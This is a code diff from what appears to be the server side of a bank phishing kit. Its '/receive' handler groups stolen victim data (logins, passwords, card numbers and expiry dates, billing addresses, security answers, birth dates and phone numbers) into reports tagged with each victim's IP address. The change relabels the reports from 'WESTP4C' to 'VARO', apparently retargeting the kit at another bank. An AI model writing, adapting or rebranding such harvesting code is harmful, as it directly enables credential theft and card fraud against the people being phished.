@@ -247,7 +247,7 @@ app.post('/receive', async (req, res) => {
   const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
   if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
@@ -275,7 +275,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
                `👤 CARD INFO \n\n`;
 
     for (const key of myObjects) {
@@ -294,7 +294,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('message')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
                `👤 SECURITY Q&A \n\n`;
 
     for (const key of myObjects) {
@@ -313,7 +313,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumber') || lowerCaseMyObjects.includes('state')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
                `👤 CONTACT INFO \n\n`;
 
     for (const key of myObjects) {
